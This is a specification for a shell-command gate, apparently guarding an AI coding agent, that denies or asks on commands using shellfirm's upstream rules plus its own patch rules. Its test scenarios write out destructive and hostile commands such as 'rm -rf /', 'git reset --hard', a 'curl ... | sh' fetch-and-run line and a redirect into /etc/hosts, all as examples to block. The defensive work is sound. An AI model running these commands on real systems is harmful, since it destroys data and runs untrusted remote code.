# dangerous-commands Specification

## Purpose
Decide which shell commands the gate denies or asks on from shellfirm's generated rules, with claudetto's patch rules and package rules for what those rules do not cover.

## Requirements

### Requirement: Generated Upstream Rules Decide Dangerous Commands

The gate SHALL judge a shell command's danger by the generated rules of one pinned upstream list (shellfirm) plus claudetto's patch, and SHALL NOT keep a second list in `hooks/gate/rules.ts`. It SHALL feed each rule the raw text or each command `shell-words.ts` finds, re-quoted.

#### Scenario: A Reset Inside a Wrapper

- **WHEN** the command is `bash -c "git -C /tmp/x reset --hard"`
- **THEN** the gate asks, and the reason names `git:reset` and its description

#### Scenario: A Quoted Mention

- **WHEN** the command is `git commit -m 'explain git reset --hard'` or `echo '$(git reset --hard)'`
- **THEN** the gate has no objection

#### Scenario: Words After a Double Dash

- **WHEN** the command is `rm -- -r /`
- **THEN** the gate has no objection, because `-r` is an operand

### Requirement: An Upstream Severity Is the Gate's Verdict

A rule of severity Critical SHALL deny and one of severity High SHALL ask, and the gate SHALL keep that verdict where it is stricter than the hand-written rules were. A patch `override` SHALL loosen a rule only with a recorded probe that shows the rule hitting a harmless command. The generator SHALL fail when a `disable` or `override` id matches no upstream rule.

#### Scenario: A Critical Rule

- **WHEN** the command is `rm -rf /`
- **THEN** the gate denies it, naming `fs:recursively_delete`

#### Scenario: A High Rule

- **WHEN** the command is `git checkout .` or `curl https://x.test/i.sh | sh`
- **THEN** the gate asks, naming the rule

#### Scenario: A Patch Names No Rule

- **WHEN** `rules.patch.json` disables or overrides an id that upstream does not define
- **THEN** `just vendor-rules` fails and names the id

### Requirement: The Pin Is Recorded and Tested

The generated file SHALL record its source, commit, and tarball SHA-256, the generator SHALL check that SHA-256 before it reads the archive and SHALL import and run nothing from the archive, and a test SHALL run every vendored fixture through the gate's matcher: each positive hits every id it expects or is named in a skip table with its reason, and each negative hits no rule.

#### Scenario: A Fixture Disagrees

- **WHEN** a vendored positive fixture is not matched and is not in the skip table, or a negative fixture is matched
- **THEN** the lab fails and names the command and the rule ids

### Requirement: The Gate Keeps Only What the Rules Do Not Cover

`hooks/gate/rules.ts` SHALL hold only what the generated rules do not cover: `Read`- and `Write`-over-Bash, the package rules of `packages.ts`, and the hook-write ask, with `systemPath` for `Write` and `Edit` in `gate.ts`. A write into a system folder through a redirect or `tee` SHALL be a patch rule. Each patch rule SHALL name its measured gap in `design.md`.

#### Scenario: A Package Tool Beside Another Tool's Files

- **WHEN** the folder holds `bun.lock` and no `package-lock.json`, and the command is `npm install` or `pnpx tsc`; or it holds `xmake.lua` and no `CMakeLists.txt`, and the command is `cmake -B build`
- **THEN** the gate denies it and names the equivalent: `bun install`, `bunx tsc`, or `xmake config` and `xmake build`

#### Scenario: A Redirect into a System Folder

- **WHEN** the command is `echo hi > /etc/hosts`
- **THEN** the gate denies it, naming `claudetto:write-system-path`, because no surveyed list matches a redirect into a system folder
